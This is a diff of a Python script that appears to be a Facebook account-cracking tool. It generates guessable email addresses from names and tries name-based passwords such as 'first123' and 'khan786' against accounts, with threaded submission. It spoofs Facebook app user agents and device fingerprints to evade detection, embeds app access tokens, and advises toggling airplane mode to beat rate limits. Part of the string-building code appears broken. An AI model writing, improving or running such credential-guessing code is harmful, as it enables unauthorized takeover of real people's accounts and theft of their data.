@@ -94,6 +94,23 @@ else:
 os.system("rm -rf .f1")
 os.system("rm -rf .f2")
 
+ugen=[]
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/533.1'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+
 sim_id = ''
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
@@ -416,42 +433,12 @@ class crack_main():
                         limit = 5000
                 print(50*'=')
                 print(' Getting gmails...')
-                lists = ['3','4']
                 for nmbr in range(limit):
-                        lchoice = random.choice(lists)
-                        if '3' in lchoice:
-                                mail = ''.join(random.choice(string.digits) for _ in range(3))
-                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        else:
-                                mail = ''.join(random.choice(string.digits) for _ in range(4))
-                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        zee = open('mail.txt', 'r').read().splitlines()
-                with ThreadPool(max_workers=30) as formSubmit:
-                        total = str(len(zee))
-                        os.system('clear')
-                        print(logo)
-                        print(' Total Ids : '+str(len(total)))
-                        print(' Cloning Is Started Wait For Results')
-                        print(' After Every 5 Min Turn Airplane On/Off')
-                        print(50*'=')
-                        for user in zee:
-                                iid,name = user.split('|')
-                                first_name = name.rsplit(' ')[0]
-                                try:
-                                        last_name = name.rsplit(' ')[1]
-                                except IndexError:
-                                        last_name = 'Khan'
-                                fs = first_name.lower()
-                                ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                formSubmit.submit(self.m1,iid,name,passlist)
-                print(50*'=')
-                print(' SucessFully Process Is Completed ')
-                print(' Total Ok Ids : '+str(len(ok)))
-                print(' Ok Ids Save In : /sdcard/zee_ok.txt')
-                print(50*'=')
-                input('\n Press enter to back ')
-                main()
+                        nmpp = random.randint(99,9999)
+                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
+                        naseeb = open('mail.txt','a').write(nmp)
+                self.id = open('mail.txt').read().splitlines()
+                self.pasw()
         def cracknum(self,id):
                 global methods
                 os.system('clear');print(logo)
@@ -469,7 +456,7 @@ class crack_main():
         def m1(self,iid,name,passlist):
                 try:
                         global ok,loop,android_models
-                        sys.stdout.write('\r[ZEE] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
+                        sys.stdout.write('\r[ZEE-F] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                         fn = name.split(' ')[0]
                         try:
                                 ln = name.split(' ')[1]
@@ -478,24 +465,15 @@ class crack_main():
                         for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                                 infos = open('device_info.txt','r').read()
-                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                                fbbv = str(random.randint(111111111,999999999))
-                                android_version = device['android_version']
-                                model = device['model']
-                                build = device['build']
-                                fblc = device['fblc']
-                                fbcr = sim_id
-                                fbmf = device['fbmf']
-                                fbbd = device['fbbd']
-                                fbdv = device['fbdv']
-                                fbsv = device['fbsv']
-                                fbca = device['fbca']
-                                fbdm = device['fbdm']
-                                fbfw = '1'
-                                fbrv = '0'
-                                fban = 'FB4A'
-                                fbpn = 'com.facebook.katana'
-                                uas = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+                                try:
+                                        version_,model_,brand_name_,width_,height_,build_,operator_,density_=infos.split('$')
+                                except:
+                                        version_ = str(random.randint(7,13))
+                                        model_ = "Infinix"
+                                        brand_name_ = "Infinix"
+                                        width_ = "720"
+                                        height_ = "1280"
+                                uas = 'Dalvik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/'+build_+') [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/'+operator_+';FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+model_+';FBSV/'+version_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density='+density_+',width='+width_+',height='height_+'};FB_FW/1;]'
                                 fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                                 adid = str(uuid.uuid4())
                                 abhi = "5531728|62f8ce9"
@@ -523,23 +501,49 @@ class crack_main():
                 except Exception as e:
                         pass
                         #print(e)
-
         def pasw(self):
                 passlist = []
+                if not os.path.exists('device_info.txt'):
+                        os.system('clear')
+                        print(logo)
+                        print(" what is your andriod version ex 8,9,10")
+                        version_=input(' type andriod version : ')
+                        print(44*'=')
+                        print(" your mobile model name ex Techno LD7 etc")
+                        model_=input(" model Name : ")
+                        print(44*"=")
+                        print(" your mobile company name ex Techno,Redmi")
+                        brand_name_=input(" device company name : ")
+                        print(44*'=')
+                        print(" your mobile width ex 720,740,730,780 etc")
+                        width_=input(" device width : ")
+                        print(44*'=')
+                        print(" your mobile height ex 1660,1780,1730 etc")
+                        height_=input(" device height : ")
+                        print(44*'=')
+                        print(" your mobile height ex R16NW,LRX22C etc")
+                        build_=input(" build : ")
+                        print(44*'=')
+                        print(" your mobile height ex Jazz,Telenor,Zong etc")
+                        operator_=input(" Operator : ")
+                        print(44*'=')
+                        print(" your mobile height ex 2.5,3.0 etc")
+                        density_=input(" density : ")
+                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+build_+'$'+operator_+'$'+density_)
                 os.system('clear')
                 print(logo)
-                print(' for auto password list type auto or Auto')
+                print(' How many password do you want try?')
                 print(50*"=")
-                pl = input(' How Much Password Do You Want To Add ? ')
+                pl = input(' How Much Password Do You Want To Add : ')
                 if pl in ['auto','Auto','AUTO','auto or Auto']:
                         passlist.append('first123')
                         passlist.append('first12345')
                         passlist.append('first1234')
-                        passlist.append('first12')
-                        passlist.append('firstlast')
-                        passlist.append('first last')
+                        passlist.append('khan12')
+                        passlist.append('khankhan')
+                        passlist.append('khan123')
                         passlist.append('first786')
-                        passlist.append('last12')
+                        passlist.append('first12')
                         passlist.append('first1122')
                         passlist.append('last123')
                         passlist.append('last12')
@@ -566,7 +570,7 @@ class crack_main():
                 print(50*'=')
                 input('\n Press enter to back ')
                 main()
-
+      
 def create_file():
         os.system('clear')
         print(logo)
